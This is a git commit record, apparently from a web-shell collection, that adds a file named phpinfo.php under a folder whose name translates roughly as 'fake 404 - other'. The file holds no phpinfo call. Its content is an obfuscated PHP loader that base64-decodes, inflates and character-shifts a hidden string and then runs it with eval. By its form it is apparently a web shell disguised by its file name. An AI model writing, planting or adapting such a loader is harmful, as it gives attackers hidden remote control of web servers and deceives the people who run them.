571db9c9a334be9064e926fb2f460956f2ac29a9
Pings1031 <96440773+Pings1031@users.noreply.github.com>
2023-04-10 08:40:58 +0800

    Add files via upload

---
+++ 伪造404-其他/phpinfo.php
@@ -0,0 +1,9 @@
+<?php function bgql($QpCXDQ)
+{ 
+$QpCXDQ=gzinflate(base64_decode($QpCXDQ));
+ for($i=0;$i<strlen($QpCXDQ);$i++)
+ {
+$QpCXDQ[$i] = chr(ord($QpCXDQ[$i])-1);
+ }
+ return $QpCXDQ;
+ }eval(bgql("U1QEAu6C5ISS0qTiUk0tG0UDA8Vnexufreh5uX/Ks47dL/ZOebZuJndhZmFWfnoBVAFECir29MCi500buFVBbEU7RaBZGWmlCSkF+aVp+aUlMB39O55NmA4x7Fl727P1u0CWpuWnJqTkpiXlwyxu2/JqxjoUi7m508qTcg20tQ00kzS1tGy408vyU0qzCvIVgdwabkUoUE0CWq2aEOwWFOYWEhqj7KccZwOXLE4rLSvOB6qx4a4DGZiSWaCobOsAdL8imA12uo2ig72yDTe3gz03AA=="));?>
